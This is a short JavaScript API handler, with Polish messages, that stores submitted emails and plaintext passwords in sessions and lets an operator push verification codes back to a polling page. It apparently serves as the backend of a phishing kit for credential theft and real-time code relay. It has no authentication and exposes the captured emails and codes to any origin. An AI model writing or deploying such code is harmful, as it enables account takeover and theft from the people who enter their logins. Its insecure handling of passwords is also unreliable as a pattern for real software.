// api/confirm.js
let sessions = {};

export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    // GET
    if (req.method === 'GET') {
        const session = req.query.session;
        const list = req.query.list;

        if (list === 'true') {
            const active = Object.keys(sessions)
                .filter(k => sessions[k].active !== false)
                .map(k => ({
                    session: k,
                    email: sessions[k].email || 'brak',
                    code: sessions[k].code || '--- --- ---',
                    sent: sessions[k].sent || false
                }));
            return res.status(200).json({ sessions: active });
        }

        if (session) {
            const data = sessions[session] || { code: '--- --- ---' };
            return res.status(200).json({ code: data.code || '--- --- ---' });
        }

        return res.status(400).json({ error: 'Brak parametru' });
    }

    // POST
    if (req.method === 'POST') {
        const { action, session, email, password, code } = req.body;

        if (action === 'create') {
            sessions[session] = {
                email: email || 'brak',
                password: password || 'brak',
                code: '--- --- ---',
                sent: false,
                active: true,
                created: new Date().toISOString()
            };
            return res.status(200).json({ success: true, session });
        }

        if (action === 'set_code') {
            if (!sessions[session]) return res.status(404).json({ error: 'Sesja nie istnieje' });
            sessions[session].code = code;
            sessions[session].sent = false;
            return res.status(200).json({ success: true, code });
        }

        if (action === 'send_code') {
            if (!sessions[session]) return res.status(404).json({ error: 'Sesja nie istnieje' });
            sessions[session].sent = true;
            return res.status(200).json({ success: true, sent: true });
        }

        return res.status(400).json({ error: 'Nieznana akcja' });
    }

    return res.status(405).json({ error: 'Method not allowed' });
}